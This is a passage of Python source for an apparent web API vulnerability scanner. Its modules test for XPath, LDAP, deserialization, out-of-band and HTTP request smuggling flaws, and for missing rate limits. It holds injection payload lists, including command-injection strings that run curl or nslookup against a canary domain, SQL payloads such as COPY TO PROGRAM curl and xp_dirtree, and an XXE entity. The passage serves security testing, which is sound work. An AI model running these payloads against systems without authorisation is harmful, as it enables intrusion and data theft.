                        new_data  = json.loads(r.text)
                        if isinstance(orig_data, dict) and isinstance(new_data, dict):
                            added = set(new_data.keys()) - set(orig_data.keys())
                            if added:
                                return [Issue("HIGH", self.NAME, "query string", f"{key}=true",
                                              f"New fields in response: {added}",
                                              sender.base.url, "query")]
                    except Exception: pass

        if not sender.base.body: return []
        try:
            original = json.loads(sender.base.body)
            if not isinstance(original, dict): return []
        except Exception: return []

        for extra in self.PAYLOADS:
            augmented = {**original, **extra}
            r = sender.send_full_json(augmented)
            if not r: continue
            # Privilege escalation
            if base_resp.status_code in (401, 403) and r.status_code == 200:
                return [Issue("CRITICAL", self.NAME, "request body", str(extra),
                              f"Privilege escalation: {base_resp.status_code}→{r.status_code}",
                              sender.base.url, "body_json")]
            # New fields appeared in response
            if r.status_code == base_resp.status_code and r.status_code < 400:
                try:
                    orig_data = json.loads(base_resp.text)
                    new_data  = json.loads(r.text)
                    if isinstance(orig_data, dict) and isinstance(new_data, dict):
                        added = set(new_data.keys()) - set(orig_data.keys())
                        if added:
                            return [Issue("HIGH", self.NAME, "request body", str(extra),
                                          f"New fields in response: {added}",
                                          sender.base.url, "body_json")]
                except Exception: pass
        return []


# ── HTTP PARAMETER POLLUTION ──────────────────────────────────────────────
class HPPScanner:
    KEY  = "hpp"
    NAME = "HTTP Parameter Pollution"
    _MARKER = "HPP_TEST"

    @staticmethod
    def _json_contains(text: str, needle: str) -> bool:
        try:
            data = json.loads(text)
        except Exception:
            return False

        def walk(o) -> bool:
            if o == needle:
                return True
            if isinstance(o, dict):
                return any(walk(v) for v in o.values())
            if isinstance(o, list):
                return any(walk(v) for v in o)
            return isinstance(o, str) and needle in o

        return walk(data)

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if point['type'] not in ('query', 'body_form'): return []
        if not base_resp: return []
        name, value = point['name'], point['value']
        marker = self._MARKER
        if marker in (base_resp.text or ""):
            return []

        if point['type'] == 'query':
            p = urllib.parse.urlparse(sender.base.url)
            dup_q = p.query + f"&{urllib.parse.quote(name)}={marker}"
            r = sender.send_raw(url=p._replace(query=dup_q).geturl(),
                                body=sender.base.body)
            payload = f"{name}={value}&{name}={marker}"
        elif point['type'] == 'body_form' and sender.base.body:
            r = sender.send_raw(body=(sender.base.body + f"&{urllib.parse.quote(name)}={marker}"))
            payload = f"{name}=duplicate (body)"
        else:
            return []

        if not r or r.status_code >= 400:
            return []

        base_txt = base_resp.text or ""
        evidence = None
        if self._json_contains(r.text or "", marker) and not self._json_contains(base_txt, marker):
            evidence = "duplicate value applied in JSON response (last-wins / array)"
            sev = "MEDIUM"
        else:
            body = r.text or ""
            if marker in body:
                echoed = (getattr(r, "url", None) or sender.base.url or "")
                stripped = body.replace(echoed, "")
                if marker in stripped:
                    orig = str(value or "")
                    if orig and orig in stripped:
                        evidence = "both original and duplicate values reflected"
                        sev = "LOW"
                    else:
                        evidence = "duplicate value reflected (not a URL echo)"
                        sev = "LOW"
        if not evidence:
            return []
        return [Issue(sev, self.NAME, name, payload, evidence,
                      sender.base.url, point['type'])]


# ── XPATH INJECTION ───────────────────────────────────────────────────────
class XPathScanner:
    KEY  = "xpath"
    NAME = "XPath Injection"
    ERROR_PATS = [
        r'XPath', r'XPATH', r'XMLException', r'javax\.xml',
        r'lxml\.etree', r'SimpleXMLElement', r'xmlParseEntityRef',
        r'DOMXPath', r'Invalid predicate', r'evaluation failed',
        r'XPathException', r'MSXML', r'XPathEval',
    ]
    PAYLOADS = [
        "' or '1'='1",
        "' or 1=1 or 'x'='",
        "'] | //user/* | /foo['",
        "x' or name()='username' or 'x'='y",
        "' and count(/*)=1 and '1'='1",
        "' or count(parent::*)=1 or '1'='1",
        "admin' or 1=1 or ''='",
    ]
    BOOL_PAIRS = [
        ("' or '1'='1", "' and '1'='2"),
        ("' or 1=1 or 'x'='x", "' or 1=2 or 'x'='y"),
        ("1 or 1=1", "1 and 1=2"),
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        for pl in self.PAYLOADS:
            r = sender.send(point, pl)
            if r:
                for pat in self.ERROR_PATS:
                    if re.search(pat, r.text, re.I):
                        return [Issue("HIGH", f"{self.NAME} (Error-Based)",
                                      point['name'], pl, f"XPath error: {pat}",
                                      sender.base.url, point['type'],
                                      response_snippet=r.text[:500])]

        # Boolean differential
        if base_resp and base_resp.status_code == 200:
            bl = len(base_resp.text or "")
            for true_pl, false_pl in self.BOOL_PAIRS:
                if sender._should_stop():
                    break
                rt = sender.send(point, true_pl)
                rf = sender.send(point, false_pl)
                if not rt or not rf:
                    continue
                if rt.status_code != rf.status_code:
                    return [Issue("HIGH", f"{self.NAME} (Boolean)",
                                  point['name'], true_pl,
                                  f"True/false status diverge: {rt.status_code} vs {rf.status_code}",
                                  sender.base.url, point['type'],
                                  response_snippet=(rt.text or "")[:500])]
                lt, lf = len(rt.text or ""), len(rf.text or "")
                if lt < 20 or lf < 20:
                    continue
                if (rt.text != rf.text
                        and abs(lt - lf) / max(lt, lf, 1) > 0.15
                        and abs(lt - bl) < abs(lf - bl)):
                    return [Issue("HIGH", f"{self.NAME} (Boolean)",
                                  point['name'], true_pl,
                                  f"Boolean differential: true={lt}B false={lf}B baseline={bl}B",
                                  sender.base.url, point['type'],
                                  response_snippet=(rt.text or "")[:500])]
        return []


# ── LDAP INJECTION ────────────────────────────────────────────────────────
class LDAPiScanner:
    KEY  = "ldap"
    NAME = "LDAP Injection"
    ERROR_PATS = [
        r'LDAPException', r'javax\.naming', r'ldap_search',
        r'Invalid DN syntax', r'LDAP error', r'ldap:',
        r'NamingException', r'InvalidNameException',
        r'UnknownHostException.*ldap', r'LDAP: error code',
    ]
    PAYLOADS = [
        '*)(uid=*))(|(uid=*',
        '*)(|(password=*)',
        'admin)(&(password=*)',
        'admin*)((|userPassword=*)',
        '*)(&)',
        '*()|%26\'',
        '*()|&\'',
        '*))%00',
        'admin*)(objectCategory=person)(objectClass=user',
    ]
    BOOL_PAIRS = [
        ("*)(objectClass=*))(&(objectClass=*", "*)(!(objectClass=*))(&(objectClass=*"),
        ("*", "nonexistent_ldap_user_zz99"),
        ("*)(|(uid=*", "*)(!(uid=*))(|(uid=*"),
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        for pl in self.PAYLOADS:
            r = sender.send(point, pl)
            if r:
                for pat in self.ERROR_PATS:
                    if re.search(pat, r.text, re.I):
                        return [Issue("HIGH", f"{self.NAME} (Error-Based)",
                                      point['name'], pl, f"LDAP error: {pat}",
                                      sender.base.url, point['type'],
                                      response_snippet=r.text[:500])]
                if base_resp and base_resp.status_code in (401, 403) and r.status_code == 200:
                    return [Issue("CRITICAL", f"{self.NAME} (Auth Bypass)",
                                  point['name'], pl,
                                  f"Auth bypass: {base_resp.status_code}→{r.status_code}",
                                  sender.base.url, point['type'])]

        # Boolean / wildcard differential
        if base_resp:
            bl = len(base_resp.text or "")
            for true_pl, false_pl in self.BOOL_PAIRS:
                if sender._should_stop():
                    break
                rt = sender.send(point, true_pl)
                rf = sender.send(point, false_pl)
                if not rt or not rf:
                    continue
                if (base_resp.status_code in (401, 403)
                        and rt.status_code == 200
                        and rf.status_code in (401, 403, 200)
                        and rt.status_code != rf.status_code):
                    return [Issue("HIGH", f"{self.NAME} (Boolean / Wildcard)",
                                  point['name'], true_pl,
                                  f"Wildcard true→{rt.status_code}, false→{rf.status_code}",
                                  sender.base.url, point['type'],
                                  response_snippet=(rt.text or "")[:500])]
                lt, lf = len(rt.text or ""), len(rf.text or "")
                if (rt.status_code == rf.status_code == 200
                        and rt.text != rf.text
                        and abs(lt - lf) / max(lt, lf, 1) > 0.20
                        and lt > bl * 0.8):
                    return [Issue("HIGH", f"{self.NAME} (Boolean)",
                                  point['name'], true_pl,
                                  f"Boolean differential: true={lt}B false={lf}B",
                                  sender.base.url, point['type'],
                                  response_snippet=(rt.text or "")[:500])]
        return []


# ── INSECURE DESERIALIZATION (MODULE-07) ──────────────────────────────────
class DeserializationScanner:
    KEY  = "deserial"
    NAME = "Insecure Deserialization"
    ERROR_PATS = [
        r'java\.io\.ObjectInputStream', r'ClassNotFoundException',
        r'InvalidClassException',       r'java\.io\.\w+Exception',
        r'pickle\.loads',               r'UnpicklingError',
        r'_pickle\.Unpickler',          r'unserialize\(\)',
        r'__PHP_Incomplete_Class',      r'System\.Runtime\.Serialization',
        r'BinaryFormatter',             r'TypeNameHandling',
        r'JsonSerializationException',  r'com\.fasterxml\.jackson',
        r'InvalidTypeIdException',      r'Could not resolve type id',
        r'ConstructorError',            r'could not determine a constructor',
        r'yaml\.(scanner|composer|constructor)',
        r'PyYAML',                      r'yaml\.YAMLError',
        r'node-serialize',              r'Ruby.*Marshal\.load',
    ]
    # Error-only probes — unknown types / missing classes. No gadget RCE.
    PROBES = [
        'rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==',  # Java magic bytes (b64)
        'O:8:"stdClass":0:{}',                      # PHP serialized
        'a:1:{s:4:"test";s:4:"test";}',             # PHP array
        'O:21:"NonExistentClass_AS":0:{}',          # PHP unknown class
        '{"$type":"System.Object"}',                 # .NET TypeNameHandling
        '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}',
        '{"@type":"com.apiscan.DoesNotExist"}',      # Jackson default typing
        '{"@class":"com.apiscan.DoesNotExist"}',     # Jackson @class
        '!!python/name:apiscan.nonexistent_module',  # PyYAML unsafe name
        '!!python/object:__main__.ApiScanProbe {}',  # PyYAML missing class
        '{"rce":"_$$ND_FUNC$$_function(){}()"}',    # Node.js node-serialize
        'BAhvOgtNeUNsYXNzAA==',                     # Ruby Marshal
    ]

    def _error_issue(self, sender, point, r, payload: str, base_txt: str) -> Optional[Issue]:
        if not r:
            return None
        for pat in self.ERROR_PATS:
            if re.search(pat, r.text or "", re.I) and not re.search(pat, base_txt, re.I):
                return Issue("HIGH", f"{self.NAME}",
                             point['name'], payload[:40],
                             f"Deserialization error: {pat}",
                             sender.base.url, point['type'],
                             response_snippet=r.text[:500])
        return None

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        base_txt = base_resp.text if base_resp else ""
        for pl in self.PROBES:
            iss = self._error_issue(sender, point, sender.send(point, pl), pl, base_txt)
            if iss:
                return [iss]

        # Once per JSON body: add type discriminators at the root (Jackson / .NET).
        # Only the first flattened leaf runs this so we do not multiply probes.
        root = point.get("_root_json")
        first_leaf = None
        if point.get("type") == "body_json" and isinstance(root, dict) and root:
            _leaves = _flatten_json(root)
            first_leaf = _leaves[0] if _leaves else None
        if first_leaf and point.get("_key_path") == first_leaf.get("_key_path"):
            for extra in (
                {"@type": "com.apiscan.DoesNotExist"},
                {"@class": "com.apiscan.DoesNotExist"},
                {"$type": "System.Object"},
                {"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework"},
            ):
                try:
                    r = sender.send_full_json({**root, **extra})
                except Exception:
                    continue
                iss = self._error_issue(sender, point, r, json.dumps(extra), base_txt)
                if iss:
                    return [iss]
        return []



# ─────────────────────────────────────────────────────────────────────────────
# OOB / INTERACTSH INTEGRATION  (MODULE-01 — Burp Collaborator equivalent)
#
#   Install  : pip install interactsh-client
#   Usage    : python Scan.py --file curl.txt --oob
#              python Scan.py --file curl.txt --oob --oob-server oast.pro
#              python Scan.py --file curl.txt --oob --oob-token <token>
#
#   Covers   : Blind SQLi (DNS exfil), Blind CMDi (nslookup/curl),
#              Blind SSRF, Blind XXE — all via unique per-test canary domains
# ─────────────────────────────────────────────────────────────────────────────
_HAS_INTERACTSH = False
_InteractshClient = None
# The interactsh Python client ships under a few different module paths
# depending on the package version — try each known one.
for _imp_path, _cls_name in (
    ("interactsh.client", "InteractshClient"),
    ("interactsh_client", "InteractshClient"),
    ("interactsh",        "Client"),
):
    try:
        _mod = __import__(_imp_path, fromlist=[_cls_name])
        _InteractshClient = getattr(_mod, _cls_name)
        _HAS_INTERACTSH = True
        break
    except Exception:
        continue


class OOBHandler:
    """
    Manages interactsh canary domain registration, per-test unique subdomain
    generation, and post-scan interaction polling.

    server=None  → falls back to public oast.pro with a loud warning.
    Production use: always pass your own private interactsh server hostname.
    """
    _PUBLIC_SERVER = CFG.OOB_PUBLIC_FALLBACK

    def __init__(self, server: Optional[str] = None, token: str = None):
        self.enabled       = False
        self.canary_domain = None
        self._client       = None
        self._test_map:    Dict[str, Dict] = {}
        self._tm_lock      = threading.Lock()

        if not _HAS_INTERACTSH:
            tprint(f"\n{Fore.YELLOW}[!] OOB: interactsh-client not installed.{Style.RESET_ALL}")
            tprint(f"    Install: pip install interactsh-client")
            return

        # ── Server selection — warn loudly if falling back to public server ──
        if not server:
            server = self._PUBLIC_SERVER
            tprint(
                f"\n{Fore.YELLOW}[!] OOB WARNING: No --oob-server specified."
                f"\n    Falling back to PUBLIC server '{self._PUBLIC_SERVER}'."
                f"\n    All DNS/HTTP interactions will be visible to {self._PUBLIC_SERVER} operators."
                f"\n    For production use a private server: --oob-server <your-interactsh-host>"
                f"{Style.RESET_ALL}"
            )
        else:
            tprint(f"\n{Fore.CYAN}[*] OOB: Using private server '{server}'{Style.RESET_ALL}")

        try:
            kw: Dict = {'server': server}
            if token:
                kw['token'] = token
            self._client = _InteractshClient(**kw)
            raw_url = self._client.get_interaction_url()
            self.canary_domain = re.sub(r'^https?://', '', raw_url).rstrip('/')
            self.enabled = True
            tprint(f"{Fore.GREEN}[+] OOB Ready → "
                   f"{Fore.YELLOW}{self.canary_domain}{Style.RESET_ALL}")
        except Exception as e:
            tprint(f"\n{Fore.YELLOW}[!] OOB init failed: {e}{Style.RESET_ALL}")

    def make_canary(self, param: str, vuln_type: str) -> Optional[str]:
        """Return a unique canary FQDN for one test, or None if OOB is disabled."""
        if not self.enabled:
            return None
        uid = f"{vuln_type[:4]}{uuid.uuid4().hex[:8]}"
        with self._tm_lock:
            self._test_map[uid] = {'param': param, 'vuln': vuln_type}
        return f"{uid}.{self.canary_domain}"

    @staticmethod
    def _sleep_stop(secs: float, should_stop=None) -> bool:
        """Sleep in small slices; return True if aborted early."""
        end = time.time() + max(0.0, float(secs))
        while time.time() < end:
            if should_stop and should_stop():
                return True
            time.sleep(min(0.4, max(0.05, end - time.time())))
        return False

    def _match_interaction(self, full_id: str) -> Optional[Dict]:
        fid = str(full_id or "")
        with self._tm_lock:
            for uid, info in self._test_map.items():
                if uid and uid in fid:
                    return info
            # Some clients return only the correlation host — match subdomain label
            label = fid.split(".")[0] if fid else ""
            if label and label in self._test_map:
                return self._test_map[label]
        return None

    def _collect_issues(self, target_url: str, seen: set) -> List[Issue]:
        issues: List[Issue] = []
        try:
            interactions = self._client.poll() or []
        except Exception as e:
            tprint(f"    [!] OOB poll error: {e}")
            return issues

        for it in interactions:
            if not isinstance(it, dict):
                # Some clients return objects — best-effort attr access
                it = {
                    "full-id": getattr(it, "full_id", None) or getattr(it, "full-id", ""),
                    "unique-id": getattr(it, "unique_id", None) or getattr(it, "unique-id", ""),
                    "protocol": getattr(it, "protocol", "DNS"),
                    "remote-address": getattr(it, "remote_address", None)
                                      or getattr(it, "remote-address", "unknown"),
                }
            full_id  = (it.get("full-id") or it.get("unique-id")
                        or it.get("correlationID") or it.get("full_id") or "")
            protocol = str(it.get("protocol") or "DNS").upper()
            remote   = it.get("remote-address") or it.get("remote_address") or "unknown"

            matched = self._match_interaction(str(full_id))
            param = (matched or {}).get("param", "?")
            vuln  = (matched or {}).get("vuln", "injection").upper()
            key = (param, vuln, protocol, str(full_id)[:80])
            if key in seen:
                continue
            seen.add(key)

            issues.append(Issue(
                "HIGH",
                f"Blind {vuln} — OOB {protocol} Callback",
                param,
                f"canary: {full_id or '?'}",
                f"{protocol} interaction received from {remote}",
                target_url, "oob",
            ))
            tprint(f"  {Fore.RED}[!] OOB {protocol} ← {remote} "
                   f"→ param={param} / {vuln}{Style.RESET_ALL}")
        return issues

    def poll_and_report(self, target_url: str, wait_secs: int = None,
                        should_stop=None) -> List[Issue]:
        """
        Wait for DNS/HTTP callbacks (interruptible), poll mid-wait + end,
        and convert each interaction into an Issue.
        """
        if not self.enabled:
            return []
        if wait_secs is None:
            wait_secs = CFG.OOB_WAIT
        wait_secs = max(2, int(wait_secs))
        tprint(f"\n{Fore.CYAN}[*] OOB: Waiting up to {wait_secs}s for callbacks "
               f"(poll mid + end; Abort stops early)...{Style.RESET_ALL}")

        seen: set = set()
        issues: List[Issue] = []
        half = wait_secs // 2
        for chunk in (half, wait_secs - half):
            if self._sleep_stop(chunk, should_stop):
                tprint(f"    → OOB wait aborted")
                break
            batch = self._collect_issues(target_url, seen)
            if batch:
                tprint(f"    → {Fore.RED}{len(batch)} new interaction(s){Style.RESET_ALL}")
                issues.extend(batch)

        if not issues:
            tprint(f"    → No OOB interactions received")
        return issues


class OOBScanner:
    """
    Injects OOB canary payloads into each insertion point.
    Does NOT return Issues immediately — results arrive via OOBHandler.poll_and_report().
    Run this AFTER the main thread pool, then call oob.poll_and_report().
    """
    KEY  = "oob"
    NAME = "Out-of-Band (Blind) Detection"

    def _fire(self, sender: RequestSender, point: Dict, payloads: List[Tuple[str, str]],
              oob: OOBHandler) -> int:
        """Fire (vuln, payload) pairs with per-point cap. Returns count sent."""
        n = 0
        cap = max(1, int(CFG.OOB_MAX_PER_POINT))
        for vuln, pl in payloads:
            if n >= cap or sender._should_stop():
                break
            sender.send(point, pl)
            n += 1
        return n

    def scan(self, sender: RequestSender, point: Dict, base_resp,
             oob: OOBHandler) -> List[Issue]:
        if not oob or not oob.enabled:
            return []
        if sender._should_stop():
            return []

        name  = point.get("name", "") or "?"
        ptype = point.get("type", "")
        hint  = _name_hint(name)
        vtype = _value_type(str(point.get("value", "")))
        ct    = sender.base.headers.get(
                    "Content-Type",
                    sender.base.headers.get("content-type", "")).lower()

        payloads: List[Tuple[str, str]] = []

        # ── CMDi OOB ────────────────────────────────────────────────────────
        if hint == "cmd_like" or name.lower() in ("cmd", "command", "exec", "ping"):
            c = oob.make_canary(name, "cmdi")
            if c:
                payloads.extend([
                    ("cmdi", f"; nslookup {c}"),
                    ("cmdi", f"| curl http://{c}/"),
                    ("cmdi", f"`nslookup {c}`"),
                    ("cmdi", f"$(curl http://{c}/)"),
                    ("cmdi", f"& ping -c 1 {c} &"),
                ])

        # ── SSRF OOB (URL / path / host-like) ────────────────────────────────
        if (hint in ("url_like", "path_like") or vtype in ("url", "filepath")
                or ptype == "path_segment"
                or re.search(r"(url|uri|link|callback|webhook|host|endpoint|fetch)", name, re.I)):
            c = oob.make_canary(name, "ssrf")
            if c:
                payloads.extend([
                    ("ssrf", f"http://{c}/"),
                    ("ssrf", f"https://{c}/"),
                    ("ssrf", f"//{c}/"),           # protocol-relative
                    ("ssrf", c),                   # DNS-only / hostname injection
                ])

        # ── SQLi OOB (IDs / search / generic strings — skip pure URL/cmd points) ─
        want_sqli = (
            hint in ("id_like", "search_like", "auth_like")
            or vtype in ("numeric", "uuid")
            or (hint not in ("url_like", "path_like", "cmd_like")
                and vtype == "string"
                and ptype not in ("body_raw",))
        )
        if want_sqli:
            c = oob.make_canary(name, "sqli")
            if c:
                payloads.extend([
                    ("sqli", f"' AND LOAD_FILE(CONCAT('\\\\\\\\','{c}','\\\\x'))-- -"),
                    ("sqli", f"; EXEC master..xp_dirtree '\\\\{c}\\x'-- -"),
                    ("sqli", f"1;SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{c}',0x5c5c))-- -"),
                    ("sqli", f";SELECT dblink_send_query('host={c}', 'SELECT 1')-- -"),
                    ("sqli", f";COPY (SELECT 1) TO PROGRAM 'curl http://{c}/'-- -"),
                    ("sqli", f"'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('{c}'))||'"),
                ])

        # ── XXE OOB — whole-document replace only ────────────────────────────
        if ptype == "body_raw" and ("xml" in ct or str(point.get("value", "")).lstrip().startswith("<")):
            c = oob.make_canary(name, "xxe")
            if c:
                payloads.append((
                    "xxe",
                    '<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY xxe SYSTEM "http://{c}/">]>'
                    "<root>&xxe;</root>",
                ))

        sent = self._fire(sender, point, payloads, oob)
        if sent:
            vprint(f"      OOB → {name}: {sent} canary payload(s)")
        return []   # Issues arrive asynchronously via poll_and_report()


# ─────────────────────────────────────────────────────────────────────────────
# RATE LIMITING / BUSINESS LOGIC  (MODULE-09)
# ─────────────────────────────────────────────────────────────────────────────
class RateLimitScanner:
    """
    Two-mode scanner:
      1. endpoint mode  (point['type']=='endpoint'):
         Sends RAPID_COUNT rapid requests to auth-like URLs and checks for 429.
      2. per-param mode (numeric values):
         Tests extreme / negative values for business-logic flaws.
    """
    KEY  = "ratelimit"
    NAME = "Missing Rate Limiting / Business Logic"
    RAPID_COUNT = CFG.RATELIMIT_BURST

    # Auth/action endpoints that MUST have rate limiting
    _SENSITIVE_PATH = re.compile(
        r'/(?:login|auth|signin|sign[_-]?in|register|sign[_-]?up|signup|'
        r'forgot[_-]?pass(?:word)?|reset[_-]?pass(?:word)?|password[_-]?reset|'
        r'verify|otp|mfa|2fa|token|refresh[_-]?token|confirm|activate)',
        re.I
    )

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        url  = sender.base.url
        issues: List[Issue] = []

        # ── Mode 1: Endpoint-level rapid-request test ─────────
        if point['type'] == 'endpoint':
            path = urllib.parse.urlparse(url).path
            if not self._SENSITIVE_PATH.search(path):
                return []
            if not base_resp or base_resp.status_code not in (200, 201, 400, 422):
                return []

            tprint(f"    {Fore.CYAN}[rate-limit] {path} × "
                   f"{self.RAPID_COUNT} rapid...{Style.RESET_ALL}")
            statuses: List[int] = []
            for _ in range(self.RAPID_COUNT):
                r = sender.send_raw(
                    method=sender.base.method, url=url,
                    headers=sender.base.headers.copy(),
                    cookies=sender.base.cookies.copy(),
                    body=sender.base.body)
                if r:
                    statuses.append(r.status_code)
                    if r.status_code == 429:
                        break   # Good — rate limited

            if len(statuses) >= self.RAPID_COUNT and 429 not in statuses:
                ok = sum(1 for s in statuses if s < 400)
                issues.append(Issue("MEDIUM", self.NAME,
                    "endpoint", f"{self.RAPID_COUNT} rapid requests",
                    f"No 429 after {len(statuses)} requests ({ok} succeeded) "
                    f"— missing rate limiting on sensitive endpoint",
                    url, "endpoint"))

        # ── Mode 2: Per-param business logic (extreme values) ─
        elif (_value_type(str(point.get('value', ''))) == 'numeric'
              and base_resp and base_resp.status_code in (200, 201)):
            for val in ['-1', '-9999', '0', '9999999999']:
                r = sender.send(point, val)
                if not r or r.status_code not in (200, 201):
                    continue
                try:
                    data = json.loads(r.text)
                    if isinstance(data, dict):
                        has_err = any(bool(data.get(k)) for k in
                                      ('error', 'errors', 'message', 'detail'))
                        if not has_err and r.text != base_resp.text:
                            issues.append(Issue("MEDIUM",
                                "Business Logic — Extreme Value Accepted",
                                point['name'], val,
                                f"Server accepted {val} without error "
                                f"(HTTP {r.status_code})",
                                url, point['type']))
                            break
                except Exception:
                    pass

        return issues


# ─────────────────────────────────────────────────────────────────────────────
# HTTP REQUEST SMUGGLING (MODULE-16: CL.TE / TE.CL / obfuscated-TE desync)
#   Black-box "timing" technique (PortSwigger-style): send a request whose
#   Content-Length and Transfer-Encoding framing disagree, then watch whether
#   the response is abnormally delayed — a sign that a front-end/back-end pair
#   parsed the request body length differently and one of them is now stuck
#   waiting for "more" data. Needs raw sockets because `requests`/urllib3
#   normalise/refuse ambiguous CL+TE combinations.
# ─────────────────────────────────────────────────────────────────────────────
class RequestSmugglingScanner:
    KEY  = "smuggling"
    NAME = "HTTP Request Smuggling"
    _MIN_DELAY_THRESHOLD = 5.0     # seconds — floor for "suspiciously slow"
    _SOCKET_TIMEOUT      = 12

    PAYLOADS = [
        "CL.TE: POST / HTTP/1.1 | Content-Length: 4 | Transfer-Encoding: chunked",
        "TE.CL: POST / HTTP/1.1 | Transfer-Encoding: chunked | Content-Length: 6",
        r"TE.TE: Transfer-Encoding: chunked\x00 (Null-byte obfuscation)",
        "TE.TE: Transfer-Encoding : chunked (Space before colon)",
        r"TE.TE: Transfer-Encoding: \tchunked (Leading tab)",
        "TE.TE: Duplicate Transfer-Encoding: identity, chunked",
        "CL.CL: Duplicate Content-Length: 6 and 4 (conflicting length)",
        "CVE-2025-54142: OPTIONS / HTTP/1.1 | Content-Length: 30 (Method body desync)",
        "Chunk-Ext: 0;discard-this=junk (Terminating chunk extension parameter)",
        "CVE-2025-66373: abc;foo=bar (Invalid hex chunk size desync)",
        "H2.CL: POST / HTTP/2 | content-length: 4 (HTTP/2 -> HTTP/1.1 downgrade)",
        "HTTP/1.0: POST / HTTP/1.0 | Connection: keep-alive (Protocol downgrade desync)",
    ]

    def _raw_probe(self, scheme, host, port, path, extra_headers, body, timeout,
                   method="POST", proto="HTTP/1.1"):
        """Hand-craft an HTTP request over a raw socket and time the full response.

        `extra_headers` may be either a dict OR an iterable of (name, value)
        pairs. The list-of-pairs form lets callers send duplicate/conflicting
        header lines (e.g. two `Content-Length` values for a CL.CL probe, or a
        deliberately-malformed header name) — something a dict can't represent.
        """
        lines = [f"{method} {path} {proto}", f"Host: {host}"]
        _hdr_items = extra_headers.items() if isinstance(extra_headers, dict) else (extra_headers or [])
        for k, v in _hdr_items:
            lines.append(f"{k}: {v}")
        lines.append("Connection: close")
        request = ("\r\n".join(lines) + "\r\n\r\n" + body)

        t0 = time.time()
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.settimeout(timeout)
            sock.sendall(request.encode('latin-1', errors='ignore'))
            data = b""
            try:
                while len(data) < 65536:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except (socket.timeout, OSError):
                pass
            return time.time() - t0, data
        except Exception:
            return time.time() - t0, None
        finally:
            if sock:
                try: sock.close()
                except Exception: pass

    def _h2_probe(self, scheme, host, port, path, timeout):
        """Attempt an H2.CL timing probe over ALPN h2 if HTTPS and supported."""
        if scheme != 'https':
            return 0.0, None
        try:
            import h2.connection
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2', 'http/1.1'])
            sock = socket.create_connection((host, port), timeout=timeout)
            sock = ctx.wrap_socket(sock, server_hostname=host)
            if sock.selected_alpn_protocol() != 'h2':
                sock.close()
                return 0.0, None

            t0 = time.time()
            conn = h2.connection.H2Connection()
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            stream_id = conn.get_next_available_stream_id()
            headers = [
                (':method', 'POST'),
                (':authority', host),
                (':scheme', 'https'),
                (':path', path),
                ('content-type', 'application/x-www-form-urlencoded'),
                ('content-length', '4'),
            ]
            conn.send_headers(stream_id, headers, end_stream=False)
            conn.send_data(stream_id, b'X', end_stream=False)
            sock.sendall(conn.data_to_send())

            sock.settimeout(timeout)
            data = b""
            try:
                while len(data) < 16384:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except (socket.timeout, OSError):
                pass
            elapsed = time.time() - t0
            try:
                sock.close()
            except Exception:
                pass
            return elapsed, data
        except Exception:
            return 0.0, None

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if point['type'] != 'endpoint':
            return []

        parsed = urllib.parse.urlparse(sender.base.url)
        scheme = parsed.scheme or 'http'
        host   = parsed.hostname
        if not host:
            return []
        port = parsed.port or (443 if scheme == 'https' else 80)
        path = parsed.path or '/'
        if parsed.query:
            path += '?' + parsed.query

        issues: List[Issue] = []

        # Quick raw-socket baseline so the threshold adapts to slow servers
        base_elapsed, _ = self._raw_probe(
            scheme, host, port, path,
            {"Content-Length": "0", "Content-Type": "application/x-www-form-urlencoded"},
            "", timeout=self._SOCKET_TIMEOUT)
        if base_elapsed >= self._SOCKET_TIMEOUT - 1:
            return []   # target itself is too slow/unreachable — probes would be unreliable
        threshold = max(self._MIN_DELAY_THRESHOLD, base_elapsed * 4 + 3)

        tprint(f"    {Fore.CYAN}[smuggling] {path} — CL.TE / TE.CL desync timing probes"
               f"{Style.RESET_ALL}")

        # ── CL.TE probe: declared length (4) shorter than the chunked framing
        #    needs, so a TE-honouring back-end is left waiting for the rest ──
        cl_te_body = "1\r\nA\r\nX"
        elapsed, _ = self._raw_probe(scheme, host, port, path, {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "4",
            "Transfer-Encoding": "chunked",
        }, cl_te_body, timeout=self._SOCKET_TIMEOUT)
        if elapsed >= threshold:
            issues.append(Issue("CRITICAL", f"{self.NAME} (CL.TE Desync)",
                "endpoint",
                "Content-Length: 4 + Transfer-Encoding: chunked (conflicting framing)",
                f"Response delayed {elapsed:.1f}s vs baseline {base_elapsed:.1f}s — "
                f"a downstream server likely parsed the body as chunked and is still "
                f"waiting for more data (classic CL.TE smuggling signal)",
                sender.base.url, "endpoint"))
            return issues   # connection/back-end may be wedged — don't pile on more probes

        # ── TE.CL probe: terminating chunk arrives early, so a CL-honouring
        #    back-end is left waiting for declared-but-missing bytes ──
        te_cl_body = "0\r\n\r\nX"
        elapsed2, _ = self._raw_probe(scheme, host, port, path, {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        }, te_cl_body, timeout=self._SOCKET_TIMEOUT)
        if elapsed2 >= threshold:
            issues.append(Issue("CRITICAL", f"{self.NAME} (TE.CL Desync)",
                "endpoint",
                "Content-Length: 6 + Transfer-Encoding: chunked (conflicting framing)",
                f"Response delayed {elapsed2:.1f}s vs baseline {base_elapsed:.1f}s — "
